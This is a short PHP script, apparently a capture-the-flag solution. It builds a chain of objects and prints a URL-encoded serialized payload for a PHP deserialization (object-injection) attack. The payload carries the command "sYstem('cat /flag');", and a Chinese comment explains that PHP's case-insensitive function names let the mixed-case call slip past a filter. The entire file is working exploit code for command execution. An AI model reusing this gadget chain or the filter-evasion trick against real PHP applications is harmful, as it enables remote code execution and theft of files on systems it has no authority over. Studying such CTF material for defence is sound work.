
<?php
	class A{
    public $test="give_me_flag";
    public $command;
    }
    class B{
    public $external;
    public $arg;
	}
	class C{
    public $t;
    public $o;
	}
	class D{
    public $str;
    public $sentence;
	}
	$ct = new A();
	$ct->command = "sYstem('cat /flag');";#php对函数大小写不敏感，绕过过滤
	$b = new B();
	$att = new C();
	$b->external = $att;
	$c = new D();
	$att->t = $c;
	$c->str = $att;
	$c->sentence="I need flag";
	$att->o = $ct;
	echo urlencode(serialize($b));
?>